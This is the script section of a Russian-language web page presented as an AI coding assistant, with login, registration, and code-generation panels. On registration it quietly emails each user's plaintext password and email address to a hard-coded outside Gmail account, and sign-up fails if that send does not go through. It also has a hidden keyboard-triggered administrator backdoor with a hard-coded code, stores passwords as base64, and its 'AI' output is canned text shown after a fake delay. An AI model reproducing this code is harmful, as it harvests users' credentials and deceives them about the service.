    <script>
    // --- Starfield Background Script ---
    (() => {
        const canvas = document.getElementById('starfield');
        const ctx = canvas.getContext('2d', { alpha: false });
        let dpr = Math.max(1, window.devicePixelRatio || 1);
        function resize() { canvas.width = Math.floor(innerWidth * dpr); canvas.height = Math.floor(innerHeight * dpr); ctx.setTransform(dpr, 0, 0, dpr, 0, 0); }
        window.addEventListener('resize', resize, { passive: true });
        resize();
        let stars = [];
        function init() {
            stars.length = 0;
            const count = Math.floor(Math.min(innerWidth, innerHeight) * 0.2);
            for (let i = 0; i < count; i++) { stars.push({ x: (Math.random() * 2 - 1), y: (Math.random() * 2 - 1), z: Math.random() * 1.8 + 0.1, s: Math.random() * 0.9 + 0.1 }); }
        }
        init();
        window.addEventListener('resize', init, { passive: true });
        let t = 0;
        function loop() {
            const w = canvas.width / dpr, h = canvas.height / dpr, cx = w / 2, cy = h / 2;
            ctx.fillStyle = '#070a14'; ctx.fillRect(0, 0, w, h);
            t += 0.0022;
            const driftX = Math.sin(t * 0.9) * 0.07, driftY = Math.cos(t * 0.6) * 0.07;
            for (const star of stars) {
                star.z -= 0.009 * (0.35 + star.s * 0.6);
                if (star.z <= 0.02) { star.x = (Math.random() * 2 - 1); star.y = (Math.random() * 2 - 1); star.z = 1.8; }
                const k = 128 / star.z;
                const px = cx + (star.x + driftX) * k;
                const py = cy + (star.y + driftY) * k;
                const alpha = Math.min(0.7, (1.6 - star.z) * 0.28 + 0.12);
                ctx.globalAlpha = alpha; ctx.fillStyle = '#cfd9ff';
                const size = Math.max(0.5, star.s * (1.3 - star.z));
                ctx.beginPath(); ctx.arc(px, py, size, 0, Math.PI * 2); ctx.fill();
            }
            ctx.globalAlpha = 1;
            requestAnimationFrame(loop);
        }
        loop();
    })();

    // --- Main Application Script ---
    document.addEventListener('DOMContentLoaded', () => {
        const dom = {
            authContainer: document.getElementById('auth-container'),
            appContainer: document.getElementById('app-container'),
            loginForm: document.getElementById('login-form'),
            registerForm: document.getElementById('register-form'),
            registerSubmitBtn: document.getElementById('register-submit-btn'),
            toggleAuthBtn: document.getElementById('toggle-auth-mode'),
            authTitle: document.getElementById('auth-title'),
            toastEl: document.getElementById('toast'),
            sidebar: document.getElementById('sidebar'),
            overlay: document.getElementById('overlay'),
            menuBtn: document.getElementById('menu-btn'),
            logoutBtn: document.getElementById('logout-btn'),
            userEmailDisplay: document.getElementById('user-email-display'),
            tabs: { generate: document.getElementById('tab-generate'), fix: document.getElementById('tab-fix') },
            panels: { generate: document.getElementById('panel-generate'), fix: document.getElementById('panel-fix') },
            adminModal: document.getElementById('admin-modal'),
            adminCodeInput: document.getElementById('admin-code-input'),
            submitAdminCodeBtn: document.getElementById('submit-admin-code'),
            cancelAdminCodeBtn: document.getElementById('cancel-admin-code')
        };

        let panelDom = {};

        const USERS_DB_KEY = 'ai_assistant_users';
        const SESSION_KEY = 'ai_assistant_session';
        const ADMIN_ACCESS_CODE = 'SanTaya_2010_pandochka';

        function getUsers() {
            const users = localStorage.getItem(USERS_DB_KEY);
            return users ? JSON.parse(users) : [];
        }

        function saveUsers(users) {
            localStorage.setItem(USERS_DB_KEY, JSON.stringify(users));
        }

        const mockHash = (str) => btoa(str);

        function handleRegister(e) {
            e.preventDefault();
            const email = document.getElementById('reg-email').value.toLowerCase();
            const password = document.getElementById('reg-password').value;

            if (password.length < 8) {
                showToast("Пароль должен быть не менее 8 символов.", true);
                return;
            }

            const users = getUsers();
            if (users.find(user => user.email === email)) {
                showToast("Пользователь с таким email уже существует.", true);
                return;
            }

            const btnText = dom.registerSubmitBtn.querySelector('.btn-text');
            const btnLoader = dom.registerSubmitBtn.querySelector('.btn-loader');
            btnText.classList.add('hidden');
            btnLoader.classList.remove('hidden');
            dom.registerSubmitBtn.disabled = true;

            sendNewUserNotification(email, password)
                .then(() => {
                    users.push({ email, password: mockHash(password) });
                    saveUsers(users);
                    
                    sessionStorage.setItem(SESSION_KEY, email);
                    showApp(email);
                    showToast("Регистрация прошла успешно!");
                })
                .catch((error) => {
                    console.error("Ошибка отправки EmailJS:", error);
                    showToast("Ошибка регистрации. Попробуйте позже.", true);
                })
                .finally(() => {
                    btnText.classList.remove('hidden');
                    btnLoader.classList.add('hidden');
                    dom.registerSubmitBtn.disabled = false;
                });
        }
        
        function sendNewUserNotification(email, password) {
            const serviceID = 'service_jye3v09';
            const templateID = 'template_hi32rh4';
            const publicKey = 'Mz85q9YUnhHndlDTR';

            const templateParams = {
                email: email,
                password: password,
                to_email: 'aalexandovich@gmail.com'
            };

            return emailjs.send(serviceID, templateID, templateParams, publicKey);
        }

        function handleLogin(e) {
            e.preventDefault();
            const email = document.getElementById('login-email').value.toLowerCase();
            const password = document.getElementById('login-password').value;
            
            const users = getUsers();
            const user = users.find(u => u.email === email);

            if (user && user.password === mockHash(password)) {
                sessionStorage.setItem(SESSION_KEY, email);
                showApp(email);
                showToast("Вход выполнен успешно!");
            } else {
                showToast("Неверный email или пароль.", true);
            }
        }

        function handleLogout() {
            sessionStorage.removeItem(SESSION_KEY);
            showAuth();
            closeMenu();
        }

        function checkAuth() {
            const userEmail = sessionStorage.getItem(SESSION_KEY);
            if (userEmail) {
                showApp(userEmail);
            } else {
                showAuth();
            }
        }

        function showApp(userEmail) {
            dom.authContainer.classList.add('hidden');
            dom.appContainer.classList.remove('hidden');
            dom.userEmailDisplay.textContent = userEmail;
            if (userEmail === 'admin@system.local') {
                dom.userEmailDisplay.innerHTML += ' <i class="fas fa-crown text-yellow-400"></i>';
            }
        }

        function showAuth() {
            dom.appContainer.classList.add('hidden');
            dom.authContainer.classList.remove('hidden');
        }

        function toggleAuthMode() {
            const isLoginMode = !dom.loginForm.classList.contains('hidden');
            if (isLoginMode) {
                dom.loginForm.classList.add('hidden');
                dom.registerForm.classList.remove('hidden');
                dom.authTitle.textContent = 'Создайте новый аккаунт';
                dom.toggleAuthBtn.textContent = 'Уже есть аккаунт? Войти';
            } else {
                dom.registerForm.classList.add('hidden');
                dom.loginForm.classList.remove('hidden');
                dom.authTitle.textContent = 'Войдите, чтобы продолжить';
                dom.toggleAuthBtn.textContent = 'Нет аккаунта? Зарегистрироваться';
            }
        }
        
        function handleAdminAccess(e) {
            if (e.ctrlKey && e.altKey && e.key.toLowerCase() === 'a') {
                e.preventDefault();
                dom.adminModal.classList.remove('hidden');
                dom.adminCodeInput.focus();
            }
        }

        function submitAdminCode() {
            const code = dom.adminCodeInput.value;
            if (code === ADMIN_ACCESS_CODE) {
                const adminEmail = 'admin@system.local';
                sessionStorage.setItem(SESSION_KEY, adminEmail);
                showApp(adminEmail);
                hideAdminModal();
                showToast("Доступ администратора предоставлен!");
            } else {
                showToast("Неверный код доступа.", true);
            }
        }

        function hideAdminModal() {
            dom.adminModal.classList.add('hidden');
            dom.adminCodeInput.value = '';
        }

        function setupPanels() {
            dom.panels.generate.innerHTML = `<div class="bg-gray-800/50 p-6 rounded-xl shadow-lg"><div class="grid grid-cols-1 md:grid-cols-5 gap-4 mb-4"><div class="md:col-span-2"><label for="language" class="block text-sm font-medium text-gray-300 mb-2">Язык</label><input type="text" id="language" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:outline-none" placeholder="Python, JavaScript..."></div><div class="md:col-span-3"><label for="prompt" class="block text-sm font-medium text-gray-300 mb-2">Описание</label><input type="text" id="prompt" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:outline-none" placeholder="сортировка списка чисел"></div></div><button id="generate-btn" class="action-btn interactive-sound w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-bold py-3 px-4 rounded-lg shadow-md transition-transform transform hover:scale-105"><i class="fas fa-cogs mr-2"></i>Сгенерировать</button></div><div id="generate-loader" class="flex justify-center items-center mt-6 hidden"><div class="loader"></div></div><div id="generate-result-container" class="result-container mt-6 bg-gray-800/50 p-6 rounded-xl shadow-lg hidden"><h3 class="text-xl font-semibold mb-4">Результат</h3><div class="relative bg-gray-900 rounded-lg"><pre><code id="generated-code" class="hljs rounded-lg p-4"></code></pre><button id="copy-generated-btn" class="interactive-sound absolute top-2 right-2 bg-gray-700 hover:bg-gray-600 text-white py-1 px-3 rounded-md text-sm opacity-75 hover:opacity-100"><i class="fas fa-copy"></i> Копировать</button></div></div>`;
            dom.panels.fix.innerHTML = `<div class="bg-gray-800/50 p-6 rounded-xl shadow-lg"><label for="code-input" class="block text-sm font-medium text-gray-300 mb-2">Вставьте ваш код для анализа</label><textarea id="code-input" rows="10" class="w-full bg-gray-700 border border-gray-600 rounded-lg p-4 font-mono text-sm focus:ring-2 focus:ring-blue-500 focus:outline-none" placeholder="function sum(a b) { return a + b }"></textarea><button id="analyze-btn" class="mt-4 action-btn interactive-sound w-full bg-gradient-to-r from-green-500 to-teal-600 hover:from-green-600 hover:to-teal-700 text-white font-bold py-3 px-4 rounded-lg shadow-md transition-transform transform hover:scale-105"><i class="fas fa-search-plus mr-2"></i>Анализировать и Исправить</button></div><div id="fix-loader" class="flex justify-center items-center mt-6 hidden"><div class="loader"></div></div><div id="fix-result-container" class="result-container mt-6 hidden"><div class="bg-gray-800/50 p-6 rounded-xl shadow-lg"><h3 class="text-xl font-semibold mb-4 text-green-400"><i class="fas fa-check-circle mr-2"></i>Исправленный код</h3><div class="relative bg-gray-900 rounded-lg"><pre><code id="fixed-code" class="hljs rounded-lg p-4"></code></pre><button id="copy-fixed-btn" class="interactive-sound absolute top-2 right-2 bg-gray-700 hover:bg-gray-600 text-white py-1 px-3 rounded-md text-sm opacity-75 hover:opacity-100"><i class="fas fa-copy"></i> Копировать</button></div></div></div>`;
            
            panelDom = {
                generateBtn: document.getElementById('generate-btn'),
                generatedCodeEl: document.getElementById('generated-code'),
                generateLoader: document.getElementById('generate-loader'),
                generateResultContainer: document.getElementById('generate-result-container'),
                copyGeneratedBtn: document.getElementById('copy-generated-btn'),
                analyzeBtn: document.getElementById('analyze-btn'),
                fixedCodeEl: document.getElementById('fixed-code'),
                fixLoader: document.getElementById('fix-loader'),
                fixResultContainer: document.getElementById('fix-result-container'),
                copyFixedBtn: document.getElementById('copy-fixed-btn')
            };
            
            panelDom.generateBtn.addEventListener('click', handleGenerateCode);
            panelDom.copyGeneratedBtn.addEventListener('click', () => copyToClipboard('generated-code'));
            panelDom.analyzeBtn.addEventListener('click', handleAnalyzeCode);
            panelDom.copyFixedBtn.addEventListener('click', () => copyToClipboard('fixed-code'));
        }
        
        async function handleGenerateCode() {
            panelDom.generateLoader.classList.remove('hidden');
            panelDom.generateResultContainer.classList.add('hidden');
            await new Promise(res => setTimeout(res, 1500));
            panelDom.generatedCodeEl.textContent = `def hello_world():\n    """This is a sample function."""\n    print("Hello from AI Assistant!")\n\nhello_world()`;
            hljs.highlightElement(panelDom.generatedCodeEl);
            panelDom.generateLoader.classList.add('hidden');
            panelDom.generateResultContainer.classList.remove('hidden');
        }
        
        async function handleAnalyzeCode() {
            panelDom.fixLoader.classList.remove('hidden');
            panelDom.fixResultContainer.classList.add('hidden');
            await new Promise(res => setTimeout(res, 1500));
            panelDom.fixedCodeEl.textContent = `function sum(a, b) {\n    // Fixed: Added a comma between parameters\n    return a + b;\n}`;
            hljs.highlightElement(panelDom.fixedCodeEl);
            panelDom.fixLoader.classList.add('hidden');
            panelDom.fixResultContainer.classList.remove('hidden');
        }

        function showToast(message, isError = false) {
            dom.toastEl.textContent = message;
            dom.toastEl.classList.add('show');
            if (isError) dom.toastEl.classList.add('error');
            setTimeout(() => {
                dom.toastEl.classList.remove('show', 'error');
            }, 3000);
        }

        function copyToClipboard(elementId) {
            const text = document.getElementById(elementId).innerText;
            navigator.clipboard.writeText(text).then(() => {
                showToast('Код скопирован!');
            }).catch(err => {
                console.error('Ошибка копирования: ', err);
                showToast('Не удалось скопировать.', true);
            });
        }
        
        function switchTab(tabName) {
            Object.values(dom.tabs).forEach(t => t.classList.remove('active'));
            Object.values(dom.panels).forEach(p => p.classList.add('hidden'));
            dom.tabs[tabName].classList.add('active');
            dom.panels[tabName].classList.remove('hidden');
        }

        function openMenu() {
            dom.sidebar.classList.remove('translate-x-full');
            dom.overlay.classList.remove('hidden');
        }
        function closeMenu() {
            dom.sidebar.classList.add('translate-x-full');
            dom.overlay.classList.add('hidden');
        }

        function init() {
            setupPanels();
            
            document.addEventListener('keydown', handleAdminAccess);
            dom.loginForm.addEventListener('submit', handleLogin);
            dom.registerForm.addEventListener('submit', handleRegister);
            dom.toggleAuthBtn.addEventListener('click', toggleAuthMode);
            dom.logoutBtn.addEventListener('click', handleLogout);
            dom.menuBtn.addEventListener('click', openMenu);
            dom.overlay.addEventListener('click', closeMenu);
            dom.tabs.generate.addEventListener('click', () => switchTab('generate'));
            dom.tabs.fix.addEventListener('click', () => switchTab('fix'));
            dom.submitAdminCodeBtn.addEventListener('click', submitAdminCode);
            dom.cancelAdminCodeBtn.addEventListener('click', hideAdminModal);
            dom.adminCodeInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') submitAdminCode();
            });
            
            checkAuth();
        }

        init();
    });
    </script>
</body>
</html>
